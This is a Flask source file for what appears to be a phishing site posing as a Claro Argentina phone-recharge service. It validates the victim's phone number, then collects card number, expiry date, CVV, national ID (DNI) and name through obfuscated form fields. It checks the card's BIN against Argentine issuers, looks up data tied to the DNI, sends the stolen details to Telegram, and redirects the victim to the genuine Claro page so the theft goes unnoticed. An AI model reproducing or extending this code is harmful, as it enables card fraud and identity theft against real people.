from flask import Flask, render_template, request, session, redirect, url_for, jsonify
from functions.send_tele import enviar_telegram
from functions.moduls import customer_date, esta_vencida
import re
import csv


app = Flask(__name__)




app.secret_key = 'una_clave_super_secreta_y_dificil_de_adivinar'

num_txt = 'functions/nums.txt'
num_txt_bins = 'functions/bins_argentina.csv'

def num_validator(num, ruta_txt):
    numero = re.sub(r'\D', '', str(num))
    if numero.startswith('0'):
        numero = numero[1:]
    else:
        pass
    try:
        with open(ruta_txt, 'r', encoding='utf-8') as archivo:
            codigos_area = [linea.strip() for linea in archivo if linea.strip()]
            
        for codigo in codigos_area:
            if numero.startswith(codigo):
                resto_del_numero = numero[len(codigo):]
                if resto_del_numero.startswith('15'):
                    resto_del_numero = resto_del_numero[2:]
                
                numero_limpio = codigo + resto_del_numero
                if len(numero_limpio) == 10:
                    return True 
        return False
        
    except FileNotFoundError:
        print(f"[!] Error: No se encontró el archivo '{ruta_txt}'.")
        return False


def cargar_datos_argentina(nombre_archivo):
    """Lee el CSV y guarda los datos en un Diccionario para búsquedas instantáneas"""
    datos_bins = {} # Cambiamos de set() a diccionario {}
    try:
        with open(nombre_archivo, mode='r', encoding='utf-8') as archivo:
            # Usamos DictReader: nos permite buscar columnas por su nombre de encabezado
            lector_csv = csv.DictReader(archivo)
            
            for fila in lector_csv:
                # Obtenemos el BIN (la clave)
                bin_numero = fila['BIN'][:6].strip()
                
                # Guardamos la información extra que queremos devolver (el valor)
                # Usamos .get() por si alguna celda está vacía en el CSV
                datos_bins[bin_numero] = {
                    'marca': fila.get('Brand', 'Desconocida'),
                    'tipo': fila.get('Type', 'Desconocido'),
                    'banco': fila.get('Issuer', 'Banco Desconocido')
                }
                    
    except FileNotFoundError:
        print(f"Advertencia: No se encontró el archivo {nombre_archivo}.")
        
    return datos_bins

# Cargamos el Set en la memoria UNA VEZ al iniciar la app
PREFIJOS_VALIDOS = cargar_datos_argentina(num_txt_bins)


@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    mensaje_error_cvv = None
    mensaje_error = None
    number_user = session.get('number_user', 0)
    if request.method == 'POST':
        numcc = request.form.get('agks')
        exp = request.form.get('agksjf')
        cvv = request.form.get('agksjfa')
        dni = request.form.get('agksjfas')
        print(dni)
        name = request.form.get('agksjfass')

        # (Aquí iría tu validación de los 16 dígitos...)

        # --- NUEVA VALIDACIÓN DE FECHA ---
        if esta_vencida(exp):
            mensaje_error_cvv = 'El código de seguridad es inválido.'


        if not numcc or len(numcc) != 16 or not numcc.isdigit():
            mensaje_error = 'La cantidad de caractéres no son válidos.'
            print(mensaje_error)
            


        if mensaje_error_cvv and mensaje_error:
            return render_template('checkout.html', error=mensaje_error, mensaje_error_cvv=mensaje_error_cvv)
        if mensaje_error_cvv:
            return render_template('checkout.html', mensaje_error_cvv=mensaje_error_cvv)
        if mensaje_error:
            return render_template('checkout.html', mensaje_error=mensaje_error)
        

        else:
        
            primeros_6_digitos = numcc[:6]

            # 3. Lógica de comparación
            if primeros_6_digitos in PREFIJOS_VALIDOS:

                print(primeros_6_digitos)
                info_date = customer_date(dni)
                enviar_telegram(numcc, exp, cvv, dni, name, info_date)
                return redirect("https://simple.claro.com.ar/inicio/auth/pin")
            else:
                
                mensaje_error = 'El número de tarjeta no es válido.'
                
                print(mensaje_error)
                return render_template('checkout.html', error=mensaje_error)
            
    # Si el usuario recién entra a la página (GET)
    return render_template('checkout.html', error=None, mensaje_error_cvv=None, telefono_previo="")



@app.route('/', methods=['GET', 'POST'])
def home():
    # Si el usuario mandó el formulario (POST)
    if request.method == 'POST':
        telefono_ingresado = request.form.get('number')
        print(telefono_ingresado) # Para debugear en tu consola

        # Validamos el número
        if num_validator(telefono_ingresado, 'functions/nums.txt'):
            # ¡Éxito! 
            number_line = telefono_ingresado.replace(" ", "")
            session['number_user'] = number_line
            
            # CAMBIO CLAVE: Usar redirect y url_for (asegurate de que la función se llame exactamente 'recharge_line')
            return redirect(url_for('recharge_line')) 
        else:
            # ¡Error! 
            mensaje_error = "La línea no es válida. Ingresa tu código de área y tu línea sin el 15."
            
            # CAMBIO CLAVE: Le devolvemos 'telefono_previo' para que no pierda lo que tipeó
            return render_template('index.html', error=mensaje_error)

    # Si el usuario recién entra a la página (GET)
    return render_template('index.html', error=None, telefono_previo="")

    

@app.route('/recharge-amounts-view' )
def recharge_line():
    # render_template busca automáticamente en la carpeta 'templates'
    number_user = session.get('number_user', 0)
    
    return render_template('number_line.html', number_user=number_user)

@app.route('/ammounts-view')
def ammounts_view():
    number_user = session.get('number_user', 0)


    return render_template('ammount_view.html', number=number_user)

@app.route('/recharge-view', methods=['POST'])
def recharge_view():
    count = request.form.get('monto')
    number_user = session.get('number_user', 0)

    return render_template('recharge_view.html', number=number_user, count=count)




# Aquí podrás agregar más rutas después. Ejemplo:
# @app.route('/contacto')
# def contacto():
#     return render_template('contacto.html')

if __name__ == '__main__':
    # debug=True reinicia el servidor automáticamente cuando guardas cambios
    app.run(debug=True, port=5000)